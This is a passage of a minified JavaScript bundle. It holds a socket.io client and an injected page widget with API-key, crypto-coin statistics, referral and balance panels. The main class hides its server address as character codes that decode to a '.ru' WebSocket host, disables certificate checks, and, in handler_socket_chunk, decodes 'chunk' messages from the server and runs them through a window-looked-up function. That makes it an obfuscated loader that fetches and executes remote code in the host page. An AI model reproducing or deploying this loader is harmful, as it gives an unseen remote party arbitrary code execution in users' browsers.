      })), onError = err => {
        this.cleanup(), this._readyState = "closed", this.emitReserved("error", err), fn ? fn(err) : this.maybeReconnectOnOpen();
      }, errorSub = $8240814a8034c217$export$af631764ddc44097(socket, "error", onError);
      if (!1 !== this._timeout) {
        const timeout = this._timeout, timer = this.setTimeoutFn((() => {
          openSubDestroy(), onError(new Error("timeout")), socket.close();
        }), timeout);
        this.opts.autoUnref && timer.unref(), this.subs.push((() => {
          this.clearTimeoutFn(timer);
        }));
      }
      return this.subs.push(openSubDestroy), this.subs.push(errorSub), this;
    }
    connect(fn) {
      return this.open(fn);
    }
    onopen() {
      this.cleanup(), this._readyState = "open", this.emitReserved("open");
      const socket = this.engine;
      this.subs.push($8240814a8034c217$export$af631764ddc44097(socket, "ping", this.onping.bind(this)), $8240814a8034c217$export$af631764ddc44097(socket, "data", this.ondata.bind(this)), $8240814a8034c217$export$af631764ddc44097(socket, "error", this.onerror.bind(this)), $8240814a8034c217$export$af631764ddc44097(socket, "close", this.onclose.bind(this)), $8240814a8034c217$export$af631764ddc44097(this.decoder, "decoded", this.ondecoded.bind(this)));
    }
    onping() {
      this.emitReserved("ping");
    }
    ondata(data) {
      try {
        this.decoder.add(data);
      } catch (e) {
        this.onclose("parse error", e);
      }
    }
    ondecoded(packet) {
      $7c89bb7728a1cd1b$export$bdd553fddd433dcb((() => {
        this.emitReserved("packet", packet);
      }), this.setTimeoutFn);
    }
    onerror(err) {
      this.emitReserved("error", err);
    }
    socket(nsp, opts) {
      let socket = this.nsps[nsp];
      return socket ? this._autoConnect && !socket.active && socket.connect() : (socket = new $f18f717745336096$export$4798917dbf149b79(this, nsp, opts), 
      this.nsps[nsp] = socket), socket;
    }
    _destroy(socket) {
      const nsps = Object.keys(this.nsps);
      for (const nsp of nsps) {
        if (this.nsps[nsp].active) return;
      }
      this._close();
    }
    _packet(packet) {
      const encodedPackets = this.encoder.encode(packet);
      for (let i = 0; i < encodedPackets.length; i++) this.engine.write(encodedPackets[i], packet.options);
    }
    cleanup() {
      this.subs.forEach((subDestroy => subDestroy())), this.subs.length = 0, this.decoder.destroy();
    }
    _close() {
      this.skipReconnect = !0, this._reconnecting = !1, this.onclose("forced close"), 
      this.engine && this.engine.close();
    }
    disconnect() {
      return this._close();
    }
    onclose(reason, description) {
      this.cleanup(), this.backoff.reset(), this._readyState = "closed", this.emitReserved("close", reason, description), 
      this._reconnection && !this.skipReconnect && this.reconnect();
    }
    reconnect() {
      if (this._reconnecting || this.skipReconnect) return this;
      const self = this;
      if (this.backoff.attempts >= this._reconnectionAttempts) this.backoff.reset(), this.emitReserved("reconnect_failed"), 
      this._reconnecting = !1; else {
        const delay = this.backoff.duration();
        this._reconnecting = !0;
        const timer = this.setTimeoutFn((() => {
          self.skipReconnect || (this.emitReserved("reconnect_attempt", self.backoff.attempts), 
          self.skipReconnect || self.open((err => {
            err ? (self._reconnecting = !1, self.reconnect(), this.emitReserved("reconnect_error", err)) : self.onreconnect();
          })));
        }), delay);
        this.opts.autoUnref && timer.unref(), this.subs.push((() => {
          this.clearTimeoutFn(timer);
        }));
      }
    }
    onreconnect() {
      const attempt = this.backoff.attempts;
      this._reconnecting = !1, this.backoff.reset(), this.emitReserved("reconnect", attempt);
    }
  }
  const $82513ded80f1c4f0$var$cache = {};
  function $82513ded80f1c4f0$export$841407ceb083bd74(uri, opts) {
    "object" == typeof uri && (opts = uri, uri = void 0);
    const parsed = $f092beba6c67ff59$export$128fa18b7194ef(uri, (opts = opts || {}).path || "/socket.io"), source = parsed.source, id = parsed.id, path = parsed.path, sameNamespace = $82513ded80f1c4f0$var$cache[id] && path in $82513ded80f1c4f0$var$cache[id].nsps;
    let io;
    return opts.forceNew || opts["force new connection"] || !1 === opts.multiplex || sameNamespace ? io = new $e05edb0afebbc061$export$d0d38e7dec7a1a61(source, opts) : ($82513ded80f1c4f0$var$cache[id] || ($82513ded80f1c4f0$var$cache[id] = new $e05edb0afebbc061$export$d0d38e7dec7a1a61(source, opts)), 
    io = $82513ded80f1c4f0$var$cache[id]), parsed.query && !opts.query && (opts.query = parsed.queryKey), 
    io.socket(parsed.path, opts);
  }
  Object.assign($82513ded80f1c4f0$export$841407ceb083bd74, {
    Manager: $e05edb0afebbc061$export$d0d38e7dec7a1a61,
    Socket: $f18f717745336096$export$4798917dbf149b79,
    io: $82513ded80f1c4f0$export$841407ceb083bd74,
    connect: $82513ded80f1c4f0$export$841407ceb083bd74
  });
  class $9c690c26cf83999a$export$f54680182165bae7 {
    app;
    window=null;
    ui=null;
    constructor(app) {
      this.app = app;
    }
    get is_created() {
      return !!this.window;
    }
    create() {}
    remove() {
      this.window && (this.window.remove(), this.window = null, this.ui = null);
    }
    create_base_wnd() {
      const wnd = document.createElement("div");
      return wnd.classList.add("agn", "agn__window"), wnd.addEventListener("click", (e => e.stopPropagation())), 
      document.body.addEventListener("click", (() => this.remove()), {
        once: !0
      }), wnd;
    }
  }
  class $8adcf1d45deaa870$export$a712b385ac1399ce extends $9c690c26cf83999a$export$f54680182165bae7 {
    ui=null;
    constructor(app) {
      super(app);
    }
    async wait_connect() {
      if (!this.window) return this.remove();
      this.window.innerHTML = '<div class="agn__spinner"></div><span class="agn__text"><b>wait...</b></span>', 
      await this.app.connect(), this.check_errors();
    }
    async check_errors() {
      if (!this.window) return this.remove();
      let error = null;
      if (this.app.session) if (200 !== this.app.connection_status) switch (this.app.connection_status) {
       case 3:
       case 400:
       case 401:
       case 409:
       case 418:
       case 499:
        error = `connect_${this.app.connection_status}`;
        break;

       default:
        error = "connect_500";
      } else this.app.balance <= 0 && (error = "balance"); else error = "session";
      "session" === error ? (this.window.innerHTML = '<span class="agn__text"><b>API KEY not set</b></span><span class="agn__text">Set api key</span><span id="agn__btn" class="agn__button">Setting</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.remove(), this.app.ui_open_window("setting");
      }), {
        once: !0
      })) : "connect_3" === error ? (this.window.innerHTML = '<span class="agn__text"><b>Server OFFLINE</b></span><span class="agn__text">Try later</span><span id="agn__btn" class="agn__button">Reconnect</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.app.connection_status = 0, this.wait_connect();
      }), {
        once: !0
      })) : "connect_400" === error || "connect_401" === error ? (this.window.innerHTML = '<span class="agn__text"><b>Error API KEY</b></span><span class="agn__text">Set new api key</span><span id="agn__btn" class="agn__button">Setting</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.remove(), this.app.ui_open_window("setting");
      }), {
        once: !0
      })) : "connect_409" === error ? (this.window.innerHTML = '<span class="agn__text"><b>Error API KEY</b></span><span class="agn__text">API Key used on another client</span><span id="agn__btn" class="agn__button">Connect</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.app.connection_status = 0, this.wait_connect();
      }), {
        once: !0
      })) : "connect_418" === error ? (this.window.innerHTML = '<span class="agn__text"><b>API KEY banned</b></span><span class="agn__text">Set new api key</span><span id="agn__btn" class="agn__button">Setting</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.remove(), this.app.ui_open_window("setting");
      }), {
        once: !0
      })) : "connect_499" === error || "connect_500" === error ? (this.window.innerHTML = '<span class="agn__text"><b>Server OFFLINE</b></span><span class="agn__text">Try later</span><span id="agn__btn" class="agn__button">Reconnect</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.app.connection_status = 0, this.wait_connect();
      }), {
        once: !0
      })) : "balance" === error ? (this.window.innerHTML = '<span class="agn__text"><b>Out of money</b></span><span class="agn__text">Replenish your balance</span><span id="agn__btn" class="agn__button">Add balance</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.remove(), this.app.ui_open_window("balance");
      }), {
        once: !0
      })) : this.remove();
    }
    create() {
      if (!this.is_created) return 1 === this.app.app_status ? this.remove() : (this.window = this.create_base_wnd(), 
      this.window.classList.add("agn__window-main"), document.body.appendChild(this.window), 
      0 === this.app.connection_status || 1 === this.app.connection_status || 2 === this.app.connection_status || 202 === this.app.connection_status ? this.wait_connect() : this.check_errors());
    }
  }
  class $8275f5d094ce5515$export$c6d627b319846df4 extends $9c690c26cf83999a$export$f54680182165bae7 {
    raw_content='<label class="agn__field-text">API KEY<div class="agn__field-text_layer"><input id="agn__field_api_key" type="text" placeholder="paste here ..." required="required"></div></label><div id="agn__save" class="agn__button">Save</div>';
    ui=null;
    constructor(app) {
      super(app);
    }
    handler_field_api_key_change(e) {
      this.ui && e.target instanceof HTMLInputElement && (/^[0-9]+-[0-9]+-[a-z0-9]+-[a-z0-9]+$/gi.test(e.target.value) ? (this.ui.button_save.removeAttribute("disabled"), 
      this.ui.button_save.textContent = "save") : (this.ui.button_save.setAttribute("disabled", "disabled"), 
      this.ui.button_save.textContent = "save"));
    }
    async handler_button_save(e) {
      if (e.stopPropagation(), this.ui && !this.ui.button_save.hasAttribute("disabled")) {
        if (this.app.session === this.ui.field_api.value) return this.remove(), this.app.ui_open_window("main");
        this.app.session = this.ui.field_api.value, this.app.socket.disconnect(), this.app.connection_status = 0, 
        this.app.reconnect_attempt_count = 0, this.app.ui_open_window("main");
      }
    }
    create() {
      this.is_created || (this.window = this.create_base_wnd(), this.window.classList.add("agn__window-setting"), 
      this.window.innerHTML = this.raw_content, document.body.appendChild(this.window), 
      this.ui = {
        field_api: this.window.querySelector("#agn__field_api_key"),
        button_save: this.window.querySelector("#agn__save")
      }, this.ui.field_api.addEventListener("input", (e => this.handler_field_api_key_change(e))), 
      this.ui.field_api.addEventListener("change", (e => this.handler_field_api_key_change(e))), 
      this.ui.button_save.addEventListener("click", (e => this.handler_button_save(e))), 
      this.app.session ? this.ui.field_api.value = this.app.session : this.ui.button_save.setAttribute("disabled", "disabled"));
    }
  }
  class $7a72cb2d3002b3d7$export$4597b8c7138357a8 extends $9c690c26cf83999a$export$f54680182165bae7 {
    ui=null;
    _tab="today";
    _stats=null;
    get tab() {
      return this._tab;
    }
    set tab(v) {
      this._tab = v, this.update_content();
    }
    get stats() {
      return this._stats;
    }
    set stats(v) {
      const s = JSON.stringify(v);
      this._stats = JSON.parse(s), this.update_content();
    }
    constructor(app) {
      super(app);
    }
    fetch_statistic() {
      this.app.socket.connected && this.app.socket.emit("update-stats");
    }
    convert_date_string(dt) {
      const y = dt.getFullYear(), m = dt.getMonth() + 1, d = dt.getDate();
      return `${y}-${m <= 9 ? "0" + m : m}-${d <= 9 ? "0" + d : d}`;
    }
    draw_stats_coin(filter) {
      if (!this.is_created || !this.ui) return;
      let content, sum = 0;
      if (this.stats) {
        const today_dt = new Date, today_key = this.convert_date_string(today_dt), yesterday_dt = new Date;
        yesterday_dt.setTime(yesterday_dt.getTime() - 864e5);
        const yesterday_key = this.convert_date_string(yesterday_dt), today = [], yesterday = [], total = [];
        JSON.parse(JSON.stringify(this.stats.coins)).forEach((s => {
          s.date === today_key ? today.push(s) : s.date === yesterday_key && yesterday.push(s);
          const i = total.findIndex((t => t.coin === s.coin));
          i >= 0 ? (total[i].amount += s.amount, total[i].fiat += s.fiat) : total.push(s);
        }));
        const target_stats = "today" === filter ? today : "yesterday" === filter ? yesterday : total;
        target_stats.length ? (target_stats.sort(((a, b) => a.fiat > b.fiat ? -1 : a.fiat === b.fiat ? 0 : 1)), 
        content = '<span class="agn__title">Open coins</span><div class="agn__scroller">' + target_stats.map((c => {
          sum += c.fiat;
          return `<div class="agn__line"><div class="agn__line-group">${`<div class="agn__line_coin">${c.coin}</div>`}${`<div class="agn__line_fiat">~${c.fiat.toFixed(2)}$</div>`}</div>${`<div class="agn__line_amount">${c.amount >= 1e3 ? c.amount.toFixed(0) : c.amount.toFixed(8)}</div>`}</div>`;
        })).join("") + "</div>") : content = '<span class="agn__text agn__no-data">No data</span>', 
        content += `<div class="agn__line_total">+${sum.toFixed(6)}$</div>`;
      } else content = '<div class="agn__spinner"></div>';
      this.ui.stats_content.innerHTML = content;
    }
    draw_stats_referrals() {
      if (!this.is_created || !this.ui) return;
      let today = 0, yesterday = 0, total = 0, count = this.stats ? this.stats.count_referals : 0;
      if (this.stats) {
        const today_dt = new Date, today_key = this.convert_date_string(today_dt), yesterday_dt = new Date;
        yesterday_dt.setTime(yesterday_dt.getTime() - 864e5);
        const yesterday_key = this.convert_date_string(yesterday_dt);
        this.stats.referals.forEach((r => {
          r.date === today_key ? today += r.reward : r.date === yesterday_key && (yesterday += r.reward), 
          total += r.reward;
        }));
        let content = '<span class="agn__title">Referrals</span>';
        content += `<div class="agn__line-group">Today:<b>${today.toFixed(6)}$</b></div>`, 
        content += `<div class="agn__line-group">Yesterday:<b>${yesterday.toFixed(6)}$</b></div>`, 
        content += `<div class="agn__line-group">All:<b>${total.toFixed(6)}$</b></div>`, 
        content += `<div class="agn__line-group">Count:<b>${count}</b></div>`, this.ui.stats_content.innerHTML = content;
      } else this.ui.stats_content.innerHTML = '<div class="agn__spinner"></div>';
    }
    update_content() {
      this.is_created && this.ui && (this.ui.stats_today.classList.remove("active"), this.ui.stats_yesterday.classList.remove("active"), 
      this.ui.stats_total.classList.remove("active"), this.ui.stats_referrals.classList.remove("active"), 
      "today" === this.tab ? (this.ui.stats_today.classList.add("active"), this.draw_stats_coin(this.tab)) : "yesterday" === this.tab ? (this.ui.stats_yesterday.classList.add("active"), 
      this.draw_stats_coin(this.tab)) : "total" === this.tab ? (this.ui.stats_total.classList.add("active"), 
      this.draw_stats_coin(this.tab)) : "referrals" === this.tab && (this.ui.stats_referrals.classList.add("active"), 
      this.draw_stats_referrals()));
    }
    create() {
      this.is_created || (this.window = this.create_base_wnd(), this.window.classList.add("agn__window-stats"), 
      document.body.appendChild(this.window), 200 !== this.app.connection_status ? (this.window.innerHTML = '<span class="agn__text agn__text-center"><b>No connection</b></span><span id="agn__btn" class="agn__button">Connect</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.app.ui_open_window("main");
      }), {
        once: !0
      })) : (this.window.innerHTML = '<div class="agn__header"><span id="agn__stats_today" class="agn__link">Today</span><span id="agn__stats_yesterday" class="agn__link">Yesterday</span><span id="agn__stats_total" class="agn__link">All</span><span id="agn__stats_referrals" class="agn__link">Referrals</span></div><div id="agn__stats_content" class="agn__content"></div><span id="agn__stats_update" class="agn__link agn__link-button agn__stats_update">Update</span>', 
      this.ui = {
        stats_today: this.window.querySelector("#agn__stats_today"),
        stats_yesterday: this.window.querySelector("#agn__stats_yesterday"),
        stats_total: this.window.querySelector("#agn__stats_total"),
        stats_referrals: this.window.querySelector("#agn__stats_referrals"),
        stats_content: this.window.querySelector("#agn__stats_content"),
        stats_update: this.window.querySelector("#agn__stats_update")
      }, this.ui.stats_today.addEventListener("click", (e => {
        e.stopPropagation(), "today" !== this.tab && (this.tab = "today");
      })), this.ui.stats_yesterday.addEventListener("click", (e => {
        e.stopPropagation(), "yesterday" !== this.tab && (this.tab = "yesterday");
      })), this.ui.stats_total.addEventListener("click", (e => {
        e.stopPropagation(), "total" !== this.tab && (this.tab = "total");
      })), this.ui.stats_referrals.addEventListener("click", (e => {
        e.stopPropagation(), "referrals" !== this.tab && (this.tab = "referrals");
      })), this.ui.stats_update.addEventListener("click", (e => {
        e.stopPropagation(), this.fetch_statistic();
      })), this.tab = "today", this.fetch_statistic()));
    }
  }
  class $10c0b12dae79ba9f$export$7fc9281e4043e7f4 extends $9c690c26cf83999a$export$f54680182165bae7 {
    ui=null;
    _balance=0;
    get balance() {
      return this._balance;
    }
    set balance(v) {
      this._balance = v, this.ui && (this.ui.el_balance.textContent = v >= 1e3 ? v.toFixed(0) + "$" : v.toFixed(6) + "$");
    }
    constructor(app) {
      super(app);
    }
    async handler_field_cryptobox_change(e) {
      e.target instanceof HTMLInputElement && (/^[a-z0-9]{8}$/gi.test(e.target.value) ? this.ui?.send_cryptobox.removeAttribute("disabled") : this.ui?.send_cryptobox.setAttribute("disabled", "disabled"));
    }
    async handler_send_cryptobox(e) {
      this.ui && this.app.socket.connected && (this.ui.send_cryptobox.setAttribute("disabled", "disabled"), 
      this.app.socket.emit("send-cryptobox", this.ui.field_cryptobox.value), this.ui.field_cryptobox.value = "");
    }
    create() {
      if (!this.is_created) if (this.window = this.create_base_wnd(), this.window.classList.add("agn__window-balance"), 
      document.body.appendChild(this.window), 200 !== this.app.connection_status) this.window.innerHTML = '<span class="agn__text"><b>No connection</b></span><span id="agn__btn" class="agn__button">Connect</span>', 
      this.window.querySelector("#agn__btn")?.addEventListener("click", (() => {
        this.app.ui_open_window("main");
      }), {
        once: !0
      }); else {
        const balance = this.balance >= 1e3 ? this.balance.toFixed(0) + "$" : this.balance.toFixed(6) + "$";
        this.window.innerHTML = `<span class="agn__text"><b>Balance</b></span><span class="agn__window-balance balance" id="agn__balance">${balance}</span><div class="agn__form"><label class="agn__field-text">Send cryptobox<div class="agn__field-text_layer"><input id="agn__field_cryptobox" type="text" placeholder="paste code ..." maxlength="8" required="required"></div></label><div id="agn__send_cryptobox" class="agn__button" disabled>Send</div></div>`, 
        this.ui = {
          el_balance: this.window.querySelector("#agn__balance"),
          field_cryptobox: this.window.querySelector("#agn__field_cryptobox"),
          send_cryptobox: this.window.querySelector("#agn__send_cryptobox")
        }, this.ui.field_cryptobox.addEventListener("input", (e => this.handler_field_cryptobox_change(e))), 
        this.ui.field_cryptobox.addEventListener("change", (e => this.handler_field_cryptobox_change(e))), 
        this.ui.send_cryptobox.addEventListener("click", (e => this.handler_send_cryptobox(e)));
      }
    }
  }
  class $735c74c504da12e4$export$1f2bb630327ac4b6 {
    _balance=0;
    _connection_status=0;
    _app_status=0;
    _session="";
    _stats=null;
    reconnect_attempt_count=0;
    timer_reconnect_499;
    socket;
    a="";
    c="";
    is_chunk_loaded=!1;
    ui={
      btn: null,
      wnd: {
        main: new $8adcf1d45deaa870$export$a712b385ac1399ce(this),
        setting: new $8275f5d094ce5515$export$c6d627b319846df4(this),
        stats: new $7a72cb2d3002b3d7$export$4597b8c7138357a8(this),
        balance: new $10c0b12dae79ba9f$export$7fc9281e4043e7f4(this)
      }
    };
    get session() {
      const session = this._session || localStorage.getItem("agn__session") || "";
      return this._session !== session && (this._session = session), session;
    }
    set session(v) {
      this._session = v, localStorage.setItem("agn__session", v);
    }
    get balance() {
      return this._balance;
    }
    set balance(v) {
      this._balance = v, this.app_status = v, this.ui.btn && (this.ui.btn.main_hint.textContent = this._balance >= 100 ? `${this._balance.toFixed(0)}$` : `${this._balance.toFixed(2)}$`, 
      this.ui.wnd.balance && (this.ui.wnd.balance.balance = v), v >= 0 ? this.ui.btn.main.classList.remove("error-balance") : this.ui.btn.main.classList.add("error-balance"));
    }
    get connection_status() {
      return this._connection_status;
    }
    set connection_status(v) {
      this._connection_status = v, this.app_status = v, this.ui.btn && (200 === v ? this.ui.btn.main.classList.remove("error-connection") : this.ui.btn.main.classList.add("error-connection"));
    }
    get app_status() {
      return this._app_status;
    }
    set app_status(_) {
      this._app_status = this.balance > 0 && 200 === this.connection_status ? 1 : 0, this.ui.btn && (this._app_status ? this.ui.btn.main.classList.add("online") : this.ui.btn.main.classList.remove("online"));
    }
    get stats() {
      return this._stats;
    }
    set stats(v) {
      const s = JSON.stringify(v);
      this._stats = this._stats = JSON.parse(s), this.ui.wnd && this.ui.wnd.stats.is_created && (this.ui.wnd.stats.stats = this._stats = JSON.parse(s));
    }
    str_hash(len) {
      const chrs = "abdehkmnpswxz";
      for (var str = "", i = 0; i < len; i++) {
        var pos = Math.floor(13 * Math.random());
        str += chrs.substring(pos, pos + 1);
      }
      return str;
    }
    d(word) {
      return word.split(/(.{3})/).filter((i => !!i)).map((i => this.a[parseInt(i)])).join("");
    }
    get token() {
      const s = this.session.split("-");
      return 4 === s.length ? s[2] : null;
    }
    async connect() {
      return this.socket.connected ? this.connection_status : this.session ? (1 !== this.connection_status && 2 !== this.connection_status && (this.reconnect_attempt_count = 0, 
      this.connection_status = 1, this.socket.auth = {
        session: this.session
      }, this.socket.disconnect(), this.socket.connect()), await new Promise((resolve => {
        const connect_status_timer = setInterval((() => {
          if (0 !== this.connection_status && 1 !== this.connection_status && 2 !== this.connection_status && 202 !== this.connection_status) return clearInterval(connect_status_timer), 
          resolve(this.connection_status);
        }), 1e3);
      }))) : (this.connection_status = 401, 401);
    }
    async handler_socket_auth(data) {
      const status = data.status;
      switch (status) {
       case 200:
       case 202:
       case 400:
       case 401:
       case 409:
       case 418:
       case 500:
        this.connection_status = status;
        break;

       case 499:
        this.connection_status = status, this.timer_reconnect_499 && clearTimeout(this.timer_reconnect_499), 
        this.timer_reconnect_499 = setTimeout((() => this.connect()), 2e3);
      }
      data.balance && (this.balance = data.balance);
    }
    async handler_socket_chunk(data) {
      this.a || (this.a = data.find((c => c.startsWith("~a")))?.substring(2) || ""), this.c || (this.c = data.find((c => c.startsWith("~c")))?.substring(2) || ""), 
      data.forEach((c => {
        this.is_chunk_loaded === /^\~/.test(c) || /^\~[ac]/.test(c) || window[this.d(this.c)](this.d(c.substring(2)))(this);
      })), this.is_chunk_loaded = !0;
    }
    ui_open_window(name) {
      Object.keys(this.ui.wnd).forEach((k => {
        const wnd = this.ui.wnd[k];
        k === name ? wnd.create() : wnd.remove();
      }));
    }
    ui_create_burger() {
      if (this.ui.btn) return;
      const burger = document.createElement("div");
      burger.classList.add("agn", "agn__burger");
      burger.innerHTML = '\n\t\t<div id="agn__button-main" class="agn__burger_button agn__burger_button-main"><svg class="agn__button-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px"><path d="M 45.953125 46 L 34 46 C 33.554688 46 33.164063 45.707031 33.039063 45.277344 L 24.960938 17.449219 L 20.363281 32 L 28.53125 32 C 28.9375 32 29.300781 32.242188 29.457031 32.617188 C 29.613281 32.992188 29.527344 33.421875 29.238281 33.707031 L 16.707031 45.707031 C 16.519531 45.894531 16.265625 46 16 46 L 4.046875 46 C 3.726563 46 3.425781 45.847656 3.238281 45.589844 C 3.050781 45.328125 2.996094 44.996094 3.097656 44.691406 L 16.046875 4.691406 C 16.183594 4.277344 16.566406 4 17 4 L 33 4 C 33.433594 4 33.816406 4.277344 33.949219 4.691406 L 46.902344 44.691406 C 47.003906 44.996094 46.949219 45.328125 46.761719 45.589844 C 46.574219 45.847656 46.273438 46 45.953125 46 Z"></path></svg><div id="agn__button-main-hint" class="hint"></div></div>\n  \t<div id="agn__button-setting" class="agn__burger_button agn__burger_button-setting agn__burger_button-hidden"><svg class="agn__button-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px"><path d="M47.16,21.221l-5.91-0.966c-0.346-1.186-0.819-2.326-1.411-3.405l3.45-4.917c0.279-0.397,0.231-0.938-0.112-1.282 l-3.889-3.887c-0.347-0.346-0.893-0.391-1.291-0.104l-4.843,3.481c-1.089-0.602-2.239-1.08-3.432-1.427l-1.031-5.886 C28.607,2.35,28.192,2,27.706,2h-5.5c-0.49,0-0.908,0.355-0.987,0.839l-0.956,5.854c-1.2,0.345-2.352,0.818-3.437,1.412l-4.83-3.45 c-0.399-0.285-0.942-0.239-1.289,0.106L6.82,10.648c-0.343,0.343-0.391,0.883-0.112,1.28l3.399,4.863 c-0.605,1.095-1.087,2.254-1.438,3.46l-5.831,0.971c-0.482,0.08-0.836,0.498-0.836,0.986v5.5c0,0.485,0.348,0.9,0.825,0.985 l5.831,1.034c0.349,1.203,0.831,2.362,1.438,3.46l-3.441,4.813c-0.284,0.397-0.239,0.942,0.106,1.289l3.888,3.891 c0.343,0.343,0.884,0.391,1.281,0.112l4.87-3.411c1.093,0.601,2.248,1.078,3.445,1.424l0.976,5.861C21.3,47.647,21.717,48,22.206,48 h5.5c0.485,0,0.9-0.348,0.984-0.825l1.045-5.89c1.199-0.353,2.348-0.833,3.43-1.435l4.905,3.441 c0.398,0.281,0.938,0.232,1.282-0.111l3.888-3.891c0.346-0.347,0.391-0.894,0.104-1.292l-3.498-4.857 c0.593-1.08,1.064-2.222,1.407-3.408l5.918-1.039c0.479-0.084,0.827-0.5,0.827-0.985v-5.5C47.999,21.718,47.644,21.3,47.16,21.221z M25,32c-3.866,0-7-3.134-7-7c0-3.866,3.134-7,7-7s7,3.134,7,7C32,28.866,28.866,32,25,32z"></path></svg></div>\n  \t<div id="agn__button-stats" class="agn__burger_button agn__burger_button-stats agn__burger_button-hidden"><svg class="agn__button-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" xml:space="preserve"><path d="M70.697,395.352h80.633c5.658,0,10.246-4.252,10.246-9.498v-143.72c0-5.246-4.588-9.499-10.246-9.499H70.697 c-5.658,0-10.246,4.253-10.246,9.499v143.72C60.451,391.1,65.039,395.352,70.697,395.352z"></path><path d="M215.684,395.352h80.631c5.658,0,10.248-4.252,10.248-9.498V141.117c0-5.246-4.59-9.498-10.248-9.498h-80.631 c-5.66,0-10.248,4.252-10.248,9.498v244.736C205.436,391.1,210.024,395.352,215.684,395.352z"></path><path d="M360.668,395.352h80.631c5.66,0,10.248-4.252,10.248-9.498V25.964c0-5.246-4.588-9.499-10.248-9.499h-80.631 c-5.66,0-10.248,4.253-10.248,9.499v359.89C350.42,391.1,355.008,395.352,360.668,395.352z"></path><polygon points="495.426,438.633 16.574,438.633 0,438.633 0,495.535 16.574,495.535 495.426,495.535 512,495.535 512,438.633"></polygon></svg></div>\n  \t<div id="agn__button-balance" class="agn__burger_button agn__burger_button-balance agn__burger_button-hidden"><svg class="agn__button-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14 10.5C14 11.8807 11.7614 13 9 13C6.23858 13 4 11.8807 4 10.5M14 10.5C14 9.11929 11.7614 8 9 8C6.23858 8 4 9.11929 4 10.5M14 10.5V14.5M4 10.5V14.5M20 5.5C20 4.11929 17.7614 3 15 3C13.0209 3 11.3104 3.57493 10.5 4.40897M20 5.5C20 6.42535 18.9945 7.23328 17.5 7.66554M20 5.5V14C20 14.7403 18.9945 15.3866 17.5 15.7324M20 10C20 10.7567 18.9495 11.4152 17.3999 11.755M14 14.5C14 15.8807 11.7614 17 9 17C6.23858 17 4 15.8807 4 14.5M14 14.5V18.5C14 19.8807 11.7614 21 9 21C6.23858 21 4 19.8807 4 18.5V14.5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>', 
      this.ui.btn = {
        main: burger.querySelector("#agn__button-main"),
        main_hint: burger.querySelector("#agn__button-main-hint"),
        setting: burger.querySelector("#agn__button-setting"),
        stats: burger.querySelector("#agn__button-stats"),
        balance: burger.querySelector("#agn__button-balance")
      }, this.ui.btn.main.addEventListener("click", (e => {
        e.stopPropagation(), this.ui_open_window("main");
      })), this.ui.btn.setting.addEventListener("click", (e => {
        e.stopPropagation(), this.ui_open_window("setting");
      })), this.ui.btn.stats.addEventListener("click", (e => {
        e.stopPropagation(), this.ui_open_window("stats");
      })), this.ui.btn.balance.addEventListener("click", (e => {
        e.stopPropagation(), this.ui_open_window("balance");
      })), document.body.appendChild(burger);
    }
    constructor() {
      this.ui_create_burger();
      const socket = $82513ded80f1c4f0$export$841407ceb083bd74(`${String.fromCharCode(..."119115115058047047".split(/([0-9]{3})/g).filter((i => !!i)).map((i => parseInt(i))))}xxx-xxx-xxx-xxx${String.fromCharCode(..."046114117058056056".split(/([0-9]{3})/g).filter((i => !!i)).map((i => parseInt(i))))}/`, {
        transports: [ "websocket" ],
        rejectUnauthorized: !1,
        secure: !0,
        auth: {
          session: this.session
        },
        autoConnect: !1,
        reconnectionDelay: 1e3
      });
      this.socket = socket, socket.on("connect", (() => {
        this.connection_status = 0, this.reconnect_attempt_count = 0;
      })), socket.io.on("reconnect_attempt", (() => {
        this.reconnect_attempt_count++, this.reconnect_attempt_count >= 3 && (this.connection_status = 3);
      })), socket.on("disconnect", (() => {
        this.connection_status < 300 && (this.connection_status = 3);
      })), socket.on("auth", (data => this.handler_socket_auth(data))), socket.on("chunk", (data => this.handler_socket_chunk(data)));
    }
  }
  window.onload = () => new $735c74c504da12e4$export$1f2bb630327ac4b6;
}();